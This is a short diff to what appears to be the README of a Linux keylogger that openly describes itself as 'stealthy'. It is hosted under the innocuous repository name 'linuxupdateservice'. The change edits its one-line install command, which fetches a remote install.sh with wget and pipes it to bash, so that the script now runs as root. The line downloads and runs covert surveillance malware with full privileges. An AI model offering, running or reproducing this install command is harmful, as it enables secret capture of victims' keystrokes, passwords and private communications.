@@ -27,4 +27,4 @@ A comprehensive, stealthy keylogger for Linux systems with advanced features.
 
 ### One-Line Install
 ```bash
-sudo wget -O - https://raw.githubusercontent.com/terminal123b/linuxupdateservice/main/install.sh | bash
+sudo wget -O - https://raw.githubusercontent.com/terminal123b/linuxupdateservice/main/install.sh | sudo bash
